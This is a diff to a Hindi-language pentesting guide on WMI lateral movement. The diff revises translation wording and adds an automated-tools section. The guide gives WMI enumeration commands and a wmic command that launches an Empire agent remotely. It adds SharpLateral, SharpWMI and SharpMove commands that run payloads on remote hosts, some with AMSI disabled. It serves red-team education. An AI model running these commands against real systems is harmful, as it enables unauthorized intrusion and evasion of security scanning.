@@ -6,13 +6,13 @@
 
 प्रक्रियाएँ उन होस्ट पर खोली जा सकती हैं जहाँ उपयोगकर्ता नाम और या तो पासवर्ड या हैश ज्ञात हैं WMI के उपयोग के माध्यम से। Wmiexec द्वारा WMI का उपयोग करके आदेश निष्पादित किए जाते हैं, जो एक अर्ध-इंटरएक्टिव शेल अनुभव प्रदान करता है।
 
-**dcomexec.py:** विभिन्न DCOM एंडपॉइंट्स का उपयोग करते हुए, यह स्क्रिप्ट wmiexec.py के समान एक अर्ध-इंटरएक्टिव शेल प्रदान करती है, विशेष रूप से ShellBrowserWindow DCOM ऑब्जेक्ट का लाभ उठाते हुए। यह वर्तमान में MMC20 का समर्थन करता है। एप्लिकेशन, शेल विंडोज़, और शेल ब्राउज़र विंडो ऑब्जेक्ट। (source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
+**dcomexec.py:** विभिन्न DCOM एंडपॉइंट्स का उपयोग करते हुए, यह स्क्रिप्ट wmiexec.py के समान एक अर्ध-इंटरएक्टिव शेल प्रदान करती है, विशेष रूप से ShellBrowserWindow DCOM ऑब्जेक्ट का लाभ उठाते हुए। यह वर्तमान में MMC20 का समर्थन करता है। एप्लिकेशन, शेल विंडोज़, और शेल ब्राउज़र विंडो ऑब्जेक्ट्स। (source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
 
 ## WMI Fundamentals
 
 ### Namespace
 
-डायरेक्टरी-शैली की पदानुक्रम में संरचित, WMI का शीर्ष-स्तरीय कंटेनर \root है, जिसके अंतर्गत अतिरिक्त निर्देशिकाएँ, जिन्हें namespaces कहा जाता है, व्यवस्थित की जाती हैं।
+डायरेक्टरी-शैली की पदानुक्रम में संरचित, WMI का शीर्ष-स्तरीय कंटेनर \root है, जिसके अंतर्गत अतिरिक्त डायरेक्टरी, जिन्हें namespaces कहा जाता है, व्यवस्थित हैं।
 Namespaces की सूची बनाने के लिए आदेश:
 ```bash
 # Retrieval of Root namespaces
@@ -32,7 +32,7 @@ gwmi -Namespace "root/microsoft" -List -Recurse
 ### **क्लासेस**
 
 WMI क्लास नाम, जैसे win32_process, और जिस नामस्थान में यह स्थित है, जानना किसी भी WMI ऑपरेशन के लिए महत्वपूर्ण है।  
-`win32` से शुरू होने वाली क्लासेस की सूची बनाने के लिए कमांड:
+`win32` से शुरू होने वाले क्लासेस की सूची बनाने के लिए कमांड:
 ```bash
 Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
 gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
@@ -85,11 +85,11 @@ wmic useraccount list /format:list
 wmic group list /format:list
 wmic sysaccount list /format:list
 ```
-WMI से विशिष्ट जानकारी, जैसे स्थानीय प्रशासक या लॉग-ऑन उपयोगकर्ताओं की दूरस्थ क्वेरी करना, सावधानीपूर्वक कमांड निर्माण के साथ संभव है।
+WMI के लिए विशिष्ट जानकारी, जैसे स्थानीय प्रशासक या लॉग-ऑन उपयोगकर्ताओं की दूरस्थ क्वेरी करना, सावधानीपूर्वक कमांड निर्माण के साथ संभव है।
 
 ### **मैनुअल रिमोट WMI क्वेरीिंग**
 
-दूरस्थ मशीन पर स्थानीय प्रशासकों और लॉग-ऑन उपयोगकर्ताओं की चुपचाप पहचान विशिष्ट WMI क्वेरियों के माध्यम से की जा सकती है। `wmic` एक टेक्स्ट फ़ाइल से पढ़ने का समर्थन भी करता है ताकि एक साथ कई नोड्स पर कमांड निष्पादित किए जा सकें।
+एक दूरस्थ मशीन पर स्थानीय प्रशासकों और लॉग-ऑन उपयोगकर्ताओं की चुपचाप पहचान विशिष्ट WMI क्वेरियों के माध्यम से की जा सकती है। `wmic` एक टेक्स्ट फ़ाइल से पढ़ने का समर्थन भी करता है ताकि एक साथ कई नोड्स पर कमांड निष्पादित किए जा सकें।
 
 WMI के माध्यम से एक प्रक्रिया को दूरस्थ रूप से निष्पादित करने के लिए, जैसे कि एक साम्राज्य एजेंट को तैनात करना, निम्नलिखित कमांड संरचना का उपयोग किया जाता है, जिसमें सफल निष्पादन "0" के लौटने वाले मान द्वारा संकेतित होता है:
 ```bash
@@ -97,14 +97,30 @@ wmic /node:hostname /user:user path win32_process call create "empire launcher s
 ```
 यह प्रक्रिया WMI की दूरस्थ निष्पादन और प्रणाली गणना की क्षमता को दर्शाती है, जो प्रणाली प्रशासन और पेनटेस्टिंग दोनों के लिए इसके उपयोगिता को उजागर करती है।
 
-## संदर्भ
-
-- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
-
 ## स्वचालित उपकरण
 
 - [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
+- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
+```bash
+SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
+# Stealthier execution with VBS
+SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
+```
+- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
+SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
+SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
+```
+- आप **Impacket's `wmiexec`** का भी उपयोग कर सकते हैं।
+
+
+## संदर्भ
+
+- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+
+
 {{#include ../../banners/hacktricks-training.md}}
